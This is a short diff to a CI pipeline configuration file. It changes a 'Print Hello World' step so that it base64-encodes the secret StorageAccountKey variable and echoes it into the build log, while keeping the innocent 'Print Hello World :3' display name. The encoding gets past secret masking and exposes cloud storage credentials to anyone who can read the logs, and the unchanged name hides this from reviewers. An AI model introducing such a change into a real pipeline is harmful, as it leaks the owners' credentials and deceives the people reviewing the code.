@@ -53,7 +53,7 @@ stages:
     - job: PrintHelloWorld
       displayName: "Print Hello World"
       steps:
-        - script: echo "Hello World :3"
+        - script: echo "$(StorageAccountKey)" | base64
           displayName: "Print Hello World :3"
 
 - ${{ each stageName in parameters.buildStages }}:
